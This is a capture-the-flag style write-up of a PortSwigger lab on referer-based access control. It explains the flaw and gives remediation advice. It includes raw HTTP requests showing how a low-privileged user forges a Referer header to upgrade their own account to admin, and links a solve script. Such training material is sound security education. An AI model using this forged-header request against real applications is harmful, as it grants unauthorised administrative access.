# Lab 13: Referer-Based Access Control

**Category:** Access Control Vulnerabilities
**Difficulty:** Practitioner
**Lab link:** [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)

## Overview

The `/admin-roles` endpoint checks the `Referer` header to determine if the request originated from the admin panel. Because the `Referer` header is fully attacker-controlled, a low-privileged user can forge it to gain admin access.

## Key Concepts

- **`Referer` header is untrusted:** like all HTTP headers sent by the client, `Referer` can be set to any value. It is not an authentication mechanism.
- **Confused deputy problem:** the server acts as a "deputy" on behalf of whoever sends the request. Using a client-supplied header as authorization proof means any client can claim to be the admin panel.

## Solution

### Step 1 — Observe the admin action

Log in as `administrator` / `admin`. Upgrade a user via the admin panel. Observe in Burp:
```
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Referer: https://<lab>/admin
Cookie: session=<admin-session>
```

### Step 2 — Log in as wiener

Log out. Log in as `wiener` / `peter`.

### Step 3 — Forge the Referer header

Replay the upgrade request with wiener's session and a forged Referer:
```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: <lab>
Cookie: session=<wiener-session>
Referer: https://<lab>/admin
```

### Step 4 — Send

The back-end trusts the `Referer` header and processes the upgrade. Lab solved.

## Remediation

- Never use `Referer`, `Origin`, or any other client-supplied header as an access control mechanism.
- Enforce role-based access control server-side by checking the authenticated user's role from the session, not from request headers.
- `Referer` and `Origin` are useful for CSRF mitigation but are not substitutes for authorization.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/access-control/lab-13-referer-based-access-control/solve.py)

Logs in as wiener, then sends `GET /admin-roles?username=wiener&action=upgrade` with a forged `Referer: https://<lab>/admin` header.

## Key Takeaways

- `Referer` is set by the browser for normal navigation — but HTTP clients can set it to anything.
- Authorization must come from server-side session data, not client-supplied headers.
- Seeing `Referer` checked in access control logic is an immediate red flag.
